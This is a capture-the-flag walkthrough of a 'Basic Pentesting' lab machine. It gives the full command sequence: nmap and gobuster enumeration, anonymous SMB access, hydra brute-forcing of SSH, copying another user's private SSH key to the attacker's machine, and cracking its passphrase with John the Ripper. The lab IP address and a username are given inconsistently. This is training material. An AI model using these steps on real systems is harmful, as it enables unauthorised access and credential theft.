# Basic Pentesting Writeup

The topics of this room are: 
- service enumeration
- brute forcing
- hash cracking 
- Linux enumeration

## Question 2: *find the services exposed by the machine*

We'll be able to get these informations using a **nmap** scan, running the following command to save the output on *initial* directory. 

``nmap -sV -sC -oA nmap/initial 10.10.164.153`` 

The output: 
<code>

    # Nmap 7.92 scan initiated Wed Apr 20 09:27:34 2022 as: nmap -sV -sC -oA nmap/initial 10.10.164.153
    Nmap scan report for 10.10.164.153
    Host is up (0.076s latency).
    Not shown: 996 closed tcp ports (conn-refused)
    PORT    STATE SERVICE     VERSION
    22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
    |   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
    |_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
    80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Site doesn't have a title (text/html).
    139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
    Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Host script results:
    |_clock-skew: mean: 1h19m59s, deviation: 2h18m33s, median: 0s
    |_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
    | smb2-security-mode: 
    |   3.1.1: 
    |_    Message signing enabled but not required
    | smb-security-mode: 
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    | smb2-time: 
    |   date: 2022-04-20T13:27:52
    |_  start_date: N/A
    | smb-os-discovery: 
    |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
    |   Computer name: basic2
    |   NetBIOS computer name: BASIC2\x00
    |   Domain name: \x00
    |   FQDN: basic2
    |_  System time: 2022-04-20T09:27:51-04:00

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done at Wed Apr 20 09:27:56 2022 -- 1 IP address (1 host up) scanned in 22.13 seconds

</code>

## Question 3: *What is the name of the hidden directory on the web server (enter name without/)?*

To retrieve these informations we can use **gobuster** with *dir* option:

``gobuster dir -w /home/kali/SecLists-master/Discovery/Web-Content/common.txt -u http://10.10.164.153 -o gobusterCommonRoot.txt``

As a result you will see that there is a page (with status code 301), and this is `/development`. You can visit it.

## Question 4-5-6-7: *Use brute-forcing to find the username & password* 

To find a username to establish a ssh connection to the remote machine, I'll try to connect to the `smb` service (we know that SMB is used from the previous *nmap* scanning). 

First we are going to list the shared folders: 

``smbclient -L \\\\10.10.164.53\\``

As a result, we'll obtain that the unique shared folder that we can access is *Anonymous*. 

We'll get the access to *Anonymous* using **smbclient**:

``smbclient -N //10.10.164.53/Anonymous``

Now, we have access to smb shell. Using `dir` command inside it, we'll observe a file *staff.txt*. We'll copy it to our local machine as follow: 

``get staff.txt``

And so, let's cat the content of this file:

![staff](/BasicPentesting/images/staff.png "staff.txt")

The answer to question 5 is: *Jan*. 

To bruteforce the password, we are going to use **hydra** tool: 

``hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.164.53 ``

As you can see, we are bruteforcing the password for a ssh connection, because from the previous nmap scan we've seen that port 22 is open. 

At this point, we can login into the system using the password retrieved: 

``ssh jan@10.10.164.53``

## Question 8: *What is the name of the other user you found(all lower case)?*

Navigating on remote machine's file system, we can see the ``/home/kay`` folder. So, *kay* is the other user. 

## Question 9: *What is the final password you obtain?*

This is a little privilege escalation task. 
In /home/kay we can see a file: *pass.bak*, but jay doesn't have access to it. So we have to log into machine as *kay*. 

Using ``ls -la`` command in /home/kay, we can see the hidden directory *.ssh*. Now, we can copy *id_rsa* file to our local machine, to get the RSA key and then connect using ssh. 

<code>

    scp id_rsa kali@<your-ip>:/home/kali/<your_directory>

    ssh -i id_rsa kay@<victim-ip>

</code>

Unfortunately, connection is protected by a passphrase. We have to bruteforce it, using **johnTheRipper*. 
First of all, from kay ssh private key, we have to get hash: 

``python3 /usr/share/john/ssh2john.py id_rsa > idrsajohn.txt`` 

Now, we are able to crack it: 

``john --wordlist=/usr/share/wordlists/rockyou.txt idrsajohn.txt``

After that, we can connect again using ssh and the newly obtained passphrase, to cat *pass.bak* file and complete the room. 







